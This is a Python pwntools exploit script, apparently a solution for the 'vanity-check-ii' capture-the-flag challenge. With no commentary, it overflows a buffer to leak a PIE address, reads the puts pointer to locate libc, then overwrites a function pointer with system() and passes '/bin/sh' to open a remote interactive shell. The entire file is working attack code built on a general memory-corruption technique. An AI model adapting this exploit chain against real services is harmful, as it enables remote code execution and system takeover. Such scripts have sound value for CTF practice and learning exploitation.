from pwn import *

p = remote("vanity-check-ii.chal.idek.team", 1337)
# p = process("./vanity_check_ii_patched", env={"LD_PRELOAD":"libc-2.31.so"})
# context.terminal = ["tmux", "splitw", "-h"]
# gdb.attach(p, """ 
#             continue
#                 """)
libc = ELF("libc-2.31.so")
p.recvuntil("(AKA mirror as a service!)")
p.send("A"*0x20 + "\x20")
p.recvline()
p.recv(0x20)
leak =  u64(p.recv(6) + "\x00\x00")
pie = leak - 0x3420
success("pie: %s"%hex(pie))
p.recv()
p.send("A"*0x20 + "\x40")
p.recv()
p.send(p64(pie + 0x3398) + "\n")
p.recv()
p.send("A"*0xf + "\n")
print p.recv()
p.recv(16)
puts = u64(p.recv(6) + "\x00\x00")
libc.address = puts - libc.symbols["puts"]
success("libc: %s"%hex(libc.address))
system = libc.symbols["system"]

p.recv()
p.send("/bin/sh\x00" + "A"*8 + p64(system) + "\n")
p.interactive()